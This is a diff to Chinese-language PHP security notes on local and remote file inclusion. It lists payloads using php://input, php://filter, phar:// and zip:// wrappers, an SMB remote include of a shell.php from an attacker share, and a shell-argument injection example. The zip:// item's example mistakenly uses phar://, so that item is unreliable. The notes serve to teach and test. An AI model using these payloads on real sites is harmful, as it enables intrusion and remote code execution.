@@ -188,17 +188,17 @@ echo escapeshellcmd('pwd $#;` '.escapeshellarg("-L;id"));//输出为pwd \$\#\;\`
 
 #### 测试
 
-* 任意文件包含漏洞 分类
+* 文件包含(File Inclusion)漏洞的分类
   * LFI(Local File Inclusion) 本地文件包含:如果文件包含函数中的参数值"文件路径"可控，通常存在"本地文件包含"漏洞
   * RFI(Remote File Inclusion)远程文件包含
     * 前置利用条件:在php.ini中必须开启2个选项才可能进行远程文件包含 `allow_url_fopen = On` (默认为On); `allow_url_include = On`(php>=5.2则默认Off)
-* 任意文件包含漏洞 利用方式
+    * 例外:以上2个选项都是Off时，可以使用smb协议，尝试使example.com包含在Windows机器(10.0.0.1)上的远程文件：先创建一个向所有人开放的共享，里面放shell.php文件，尝试包含这个文件`http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
+* 文件包含(File Inclusion)漏洞的利用方式
   * php伪协议 - `php://input` 前置利用条件为php.ini中`allow_url_include = On`  利用:POST url`xx.php?file=php://input`  POST body:`<? phpinfo();?>`
   * php伪协议 - `php://filter` 无前置利用条件  利用:`xx.php?file=php://filter/read=convert.base64-encode/resource=index.php` 或 `index.php?file=php://filter/convert.base64-encode/resource=index.php`
   * php伪协议 - `phar://` 前置利用条件为php版本>=5.3.0  利用:将内容为`<?php phpinfo(); ?>`的文件phpinfo.txt压缩为test.zip 访问绝对路径`xx.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt`或相对路径`xx.php?file=phar://test.zip/phpinfo.txt`（test.zip和xx.php在同一目录下）
   * php伪协议 - `zip://` 前置利用条件为php版本>=5.3.0  利用:将内容为`<?php phpinfo(); ?>`的文件phpinfo.txt压缩为test.zip 只能访问绝对路径`xx.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip%23phpinfo.txt` 注意需使用`%23`
-  * ...
-
+  * ... 更多利用方式 与 危害(LFI to RCE) 参考[PayloadsAllTheThings/File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
 
 
 从项目代码中查找关键字
